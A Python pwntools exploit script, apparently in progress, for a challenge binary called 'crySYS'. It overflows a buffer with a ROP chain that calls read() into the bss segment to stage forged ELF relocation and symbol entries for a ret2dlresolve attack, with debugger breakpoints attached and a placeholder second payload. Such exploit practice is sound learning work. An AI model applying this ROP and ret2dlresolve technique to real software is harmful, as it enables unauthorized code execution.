from pwn import *

# setup general settings
context.terminal = ["xfce4-terminal", "--disable-server", "-e"]
context.arch = "amd64"

# spawn process, and read elf file
p = process("./crySYS")
bin_elf = ELF("./crySYS")


RESOLVER_ADDR = 0x4003E6 # call dl_resolve wihtout pushing link_map
# we need to create our own link_map
RESOLVER_ADDR = 0x4003E0 # push link_map and call dl_resolve
# using 0x4003E0, we dont control and modify the link_map argument
c_area        = 0x601030 # controllable area (bss segment)
fake_stack    = 0x600E18 # for rbp overwrite approach

# resolve structure offsets
SYMTAB = 0x4002B8
STRTAB = 0x400318
JMPREL = 0x4003B0

POP_RSI_POP_R15_RET = 0x400581  # needed to specify controlable area for read
MOV_EDI_CALL_READ   = 0x4004FB  # call read from stdin
# amount is not needed as rdx keeps its value after the first read call

# calling read(0, buf, 0x1000) with the first ropchain to create a
# forged Elf64_Rel and Elf64_Sym entry on a known address

# argument order for read call
# read(rdi, rsi, rdx)

chain_read  = b""
chain_read += b"A"*80                   # overflow padding
#chain_read += p64(fake_stack)           # fake rbp
chain_read += b"B"*8                    # fake rbp
chain_read += p64(POP_RSI_POP_R15_RET)  # set read buffer
chain_read += p64(c_area)               # ptr to controlable buffer
chain_read += b"C"*8                    # dummy r15 data
chain_read += p64(MOV_EDI_CALL_READ)    # call read
chain_read += b"D"*16                   # note end of chain

print("Read Chain:")
print(chain_read)
print("")

#offset = 0x400505     # bp at leave
offset = 0x400506     # bp at ret
gdb.attach(p, r2cmd="db {}".format(hex(offset)))

# send read chain, first payload
p.send(chain_read)

raw_input("wait for second read")

# send second payload
p.send(b"T"*32)

# keep process alive
p.interactive()
